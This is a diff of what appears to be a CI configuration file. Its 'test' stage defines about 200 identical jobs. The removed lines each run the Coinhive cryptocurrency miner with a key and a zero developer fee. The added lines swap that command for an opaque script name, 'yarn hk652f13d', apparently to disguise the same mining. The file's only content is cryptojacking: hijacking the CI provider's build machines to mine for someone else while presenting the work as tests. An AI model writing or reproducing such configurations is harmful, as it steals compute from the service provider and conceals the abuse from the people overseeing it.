@@ -25,204 +25,204 @@ branches:
 jobs:
   include:
     - stage: test
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
-    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
+    - script: yarn hk652f13d
 
 stages:
   - test
